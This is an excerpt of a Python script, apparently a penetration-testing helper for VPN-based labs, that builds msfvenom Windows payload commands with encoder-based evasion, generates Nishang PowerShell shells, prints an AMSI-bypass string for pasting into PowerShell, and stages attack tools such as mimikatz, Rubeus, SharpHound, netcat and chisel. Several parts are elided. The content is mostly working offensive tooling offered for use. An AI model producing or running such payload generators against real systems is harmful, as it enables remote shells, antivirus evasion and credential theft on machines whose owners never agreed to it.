...
def win(ip, port, command):
    ...
    print(Fore.RED+50*"-")
    print(Fore.GREEN+"Payload generated !")
...
def ext(shell):
    ...
    if shell == "windows/exec" or shell == "windows/x64/exec":
        inp = input(Fore.RED+"[+] cmd command to run in the system >> "+Fore.GREEN)
        if str(inp) == "":
...
def windows(ip,port,shell):
    if shell == "windows/exec":
        ...
        command = "msfvenom -p "+str(shell)+" LHOST="+str(ip)+" LPORT="+str(port)+" CMD='"+str(inp)+"' -e x86/shikata_ga_nai -f "+str(extension)+" > win-shell-"+str(port)+"."+str(extension)
        win(ip,port,command)
    elif shell == "windows/x64/exec":
        extension ,inp = ext(shell)
        command = "msfvenom -p "+str(shell)+" LHOST="+str(ip)+" LPORT="+str(port)+" CMD='"+str(inp)+"' -f "+str(extension)+" > win-shell-"+str(port)+"."+str(extension)
        win(ip,port,command)
...
def get_ip():
    command = """ip addr show tun0 | grep "\<inet\>" | awk \'{ print $2 }\' | awk -F "/" \'{ print $1 }\'"""
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=None, shell=True)
    output = process.communicate()
    if output[0].decode('UTF-8').strip() == "":
        print(Fore.RED+"Please connect to VPN (tun0) to generate a shell !")
        exit(1)
    else:    
...
def get_port():
    print(Fore.GREEN+"Port between 1 and 65535 (Recommended port > 1024)")
    inp = input(Fore.RED+"[+] Enter a port number >> "+Fore.GREEN)
    try:
        res = int(inp)
        if 1 <= res <= 65535:
...
def nishang(ip,port):
    ...
    print(Fore.GREEN +"[+] ip: "+str(ip))
    print(Fore.GREEN +"[+] port: "+str(port))    
    print(Fore.RED + "[+] Your nishang shell has been created !") 
...
def amsi():
    ...
    print(Fore.RED+"Past this string into powershell: \n\n"+Fore.GREEN +string+"\n")
...
windows_tools =["accesschk.exe","curl.exe","nc.exe","powerview.ps1","wget.exe","base64.exe","dumpcap.exe","powercat.ps1","procdump64.exe","chisel86.exe","juicy.exe","powermad.ps1","Rubeus.exe","cmd.exe","mimi64.exe","powershell.exe","SharpHound.exe"]
...
if os_item == "Windows":
    ...
    if main_item == "generate shell":
        ...
        if windows_tools_item == "accesschk.exe":
            ...
            move_files("windows","tools",windows_tools_item)
        elif windows_tools_item == "mimi64.exe":
            move_files("windows","tools",windows_tools_item)
